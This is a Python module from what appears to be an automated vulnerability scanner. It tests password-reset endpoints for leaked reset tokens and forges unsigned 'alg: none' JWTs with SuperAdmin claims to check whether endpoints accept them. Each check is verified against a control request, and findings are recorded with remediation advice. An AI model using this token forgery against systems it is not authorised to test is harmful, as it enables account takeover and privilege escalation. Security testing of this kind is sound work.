"""Authentication & Session Attack Executor (JWT 'none' algorithm, Missing Auth)."""

import base64
import json

from backend.agents.executors.base import BaseAttackExecutor
from backend.agents.models import (
    AttackPlanItem,
    SeverityLevel,
    VulnerabilityCategory,
    VulnerabilityFinding,
)
from backend.agents.verifier import DoubleProofVerifier


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


class AuthSessionExecutor(BaseAttackExecutor):
    """Executes authentication bypass and session validation testing vectors."""

    async def execute(self, plan_item: AttackPlanItem, base_url: str) -> list[VulnerabilityFinding]:
        findings: list[VulnerabilityFinding] = []
        path = plan_item.target_path
        method = plan_item.method
        target_url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"

        # 1. Predictable / Leaked Password Reset Token
        if "reset" in path.lower() or "password" in path.lower():
            test_email = "agent@alpha.com"
            primary_req = {
                "method": "POST",
                "url": target_url,
                "json": {"email": test_email},
            }
            try:
                primary_resp = await self.client.request(
                    method="POST",
                    url=target_url,
                    json={"email": test_email},
                )
                if primary_resp.status_code == 200:
                    resp_json = primary_resp.json()
                    token_val = resp_json.get("reset_token")
                    if token_val:
                        control_req = {
                            "method": "POST",
                            "url": target_url,
                            "json": {"email": "invalid-not-an-email"},
                        }
                        control_resp = await self.client.request(
                            method="POST",
                            url=target_url,
                            json={"email": "invalid-not-an-email"},
                        )
                        control_succeeded = control_resp.status_code in {200, 400, 422}
                        proof = DoubleProofVerifier.verify(
                            primary_req=primary_req,
                            primary_resp=primary_resp,
                            primary_succeeded=True,
                            control_req=control_req,
                            control_resp=control_resp,
                            control_succeeded=control_succeeded,
                            notes="Password reset endpoint exposes predictable/leaked reset_token directly in JSON response.",
                        )
                        if proof.is_verified():
                            findings.append(
                                VulnerabilityFinding(
                                    title=f"Predictable / Leaked Password Reset Token on POST {path}",
                                    category=VulnerabilityCategory.AUTH_SESSION,
                                    severity=SeverityLevel.HIGH,
                                    target_endpoint=path,
                                    method="POST",
                                    description=(
                                        f"Endpoint POST {path} returns password reset tokens directly in API responses "
                                        f"or generates them using predictable timestamp hashes, allowing unauthenticated account takeover."
                                    ),
                                    proof=proof,
                                    cwe_id="CWE-330",
                                    remediation=(
                                        "Generate cryptographically secure random tokens using secrets.token_urlsafe(). "
                                        "Deliver reset tokens exclusively via out-of-band email channels, never in the HTTP response."
                                    ),
                                )
                            )
            except Exception:
                pass

        # 2. JWT 'none' Algorithm Test
        # Forge unsigned tokens: both standard JWT alg:none and none_alg token formats
        jwt_header = {"alg": "none", "typ": "JWT"}
        jwt_payload = {
            "sub": "USR_ALPHA_ADMIN",
            "agency_id": "Agency_Alpha",
            "role": "SuperAdmin",
            "iat": 1600000000,
            "exp": 2000000000,
        }
        encoded_header = _b64url_encode(json.dumps(jwt_header).encode("utf-8"))
        encoded_payload = _b64url_encode(json.dumps(jwt_payload).encode("utf-8"))
        candidate_tokens = [
            f"{encoded_header}.{encoded_payload}.",
            "none_alg_USR_ALPHA_ADMIN",
            "none_alg_admin",
        ]

        for token in candidate_tokens:
            primary_headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            primary_req = {
                "method": method,
                "url": target_url,
                "headers": primary_headers,
            }

            try:
                primary_resp = await self.client.request(
                    method=method,
                    url=target_url,
                    headers=primary_headers,
                )
            except Exception:
                continue

            # If alg=none was accepted with 200/201 on an authenticated endpoint
            if primary_resp.status_code in {200, 201}:
                # Negative control: Send an invalid malformed token
                control_headers = {
                    "Authorization": "Bearer invalid_garbage_token_sig_mismatch",
                    "Content-Type": "application/json",
                }
                control_req = {
                    "method": method,
                    "url": target_url,
                    "headers": control_headers,
                }

                try:
                    control_resp = await self.client.request(
                        method=method,
                        url=target_url,
                        headers=control_headers,
                    )
                except Exception:
                    continue

                # Negative control succeeds if invalid token is rejected with 401 or 403
                control_succeeded = control_resp.status_code in {401, 403}

                proof = DoubleProofVerifier.verify(
                    primary_req=primary_req,
                    primary_resp=primary_resp,
                    primary_succeeded=True,
                    control_req=control_req,
                    control_resp=control_resp,
                    control_succeeded=control_succeeded,
                    notes="Primary exploit used unsigned JWT (alg: none) which was accepted; control token was rejected with 401/403.",
                )

                if proof.is_verified():
                    findings.append(
                        VulnerabilityFinding(
                            title=f"JWT Signature Verification Bypass ('none' Algorithm) on {method} {path}",
                            category=VulnerabilityCategory.AUTH_SESSION,
                            severity=SeverityLevel.CRITICAL,
                            target_endpoint=path,
                            method=method,
                            description=(
                                f"Endpoint {method} {path} accepts JWT tokens with the algorithm header set to 'none', "
                                f"allowing attackers to forge arbitrary user claims and roles without cryptographic verification."
                            ),
                            proof=proof,
                            cwe_id="CWE-347",
                            remediation=(
                                "Reject all JWTs configured with algorithm 'none'. Explicitly require and whitelist allowed "
                                "cryptographic signing algorithms (e.g. RS256, ES256) and verify signatures before processing claims."
                            ),
                        )
                    )
                    break

        return findings
